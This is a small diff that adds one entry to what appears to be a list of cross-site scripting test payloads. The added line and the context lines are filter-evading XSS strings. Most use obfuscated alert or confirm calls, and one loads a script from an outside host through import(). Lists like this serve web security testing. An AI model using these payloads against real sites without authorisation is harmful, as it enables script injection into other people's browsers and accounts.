@@ -67,6 +67,7 @@ java%0D%0Ascript%0D%0A:alert(document.domain)
 ';k='e'%0Atop['al'+k+'rt'](1)//
 “>-setTimeout`\u0028alert(1)\u0029`-’
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+">|<img src=x onerror=alert(document.domain)>
 <Img Src=OnXSS OnError=confirm(1337)>
 <Img Src=//X55.is OnLoad%0C=import(Src)>
 ">'><details/open/ontoggle=confirm('XSS')>
